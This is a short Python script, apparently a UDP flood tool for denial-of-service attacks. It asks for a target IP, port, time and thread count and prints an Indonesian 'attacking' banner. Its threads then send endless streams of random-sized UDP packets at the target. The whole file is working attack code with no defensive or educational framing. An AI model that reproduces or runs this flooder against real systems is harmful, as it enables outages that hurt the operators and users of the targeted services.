import os, sys, random, socket, threading, time


#Banh
R = '\033[91m'

os.system("clear")
ip = str(input(" Ip:"))
port = int(input(" Port:"))
times = int(input(" Time:"))
threads = int(input(" Threads:"))
choice = str(input(" y/n :"))

os.system("clear")
print(R+"============================")
print(R+"Menyerang ip %s dan port %s"%(ip, port))
print(R+"============================")
def Z():
	hide = random._urandom(1080)
	while True:
		try:
			F = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				F.sendto(hide,addr)
		except:
			time.sleep(.1)

def Z2():
	hide = random._urandom(1025)
	while True:
		try:
			D = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			D.connect((ip,port))
			D.send(hide)
			for x in range(times):
				D.send(hide)
		except:
			D.close()

def Z3():
	hide = random._urandom(16)
	while True:
		try:
			R = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			R.connect((ip,port))
			R.send(hide)
			for x in range(times):
				R.send(hide)
		except:
			R.close()


for y in range(threads):
	if choice == 'y':
		ls = threading.Thread(target = Z)
		ls.start()
		th = threading.Thread(target = Z2)
		th.start()
	else:
		zx = threading.Thread(target = Z3)
		zx.start()




pass